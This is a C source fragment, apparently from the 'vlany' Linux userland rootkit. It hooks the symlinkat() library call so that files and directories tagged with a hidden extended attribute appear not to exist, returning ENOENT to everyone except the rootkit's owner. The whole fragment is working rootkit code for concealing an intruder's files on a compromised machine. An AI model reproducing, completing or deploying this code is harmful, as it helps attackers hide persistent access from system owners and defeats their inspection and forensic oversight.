int symlinkat(const char *target, int newdirfd, const char *linkpath)
{
    #ifdef DEBUG
        printf("[vlany] symlinkat() called\n");
    #endif

    HOOK(old_symlinkat, CSYMLINKAT);

    if(owned()) return old_symlinkat(target, newdirfd, linkpath);

    if(hidden_xattr(target) || hidden_xattr(linkpath) || hidden_fxattr(newdirfd)) { errno = ENOENT; return -1; }

    return old_symlinkat(target, newdirfd, linkpath);
}
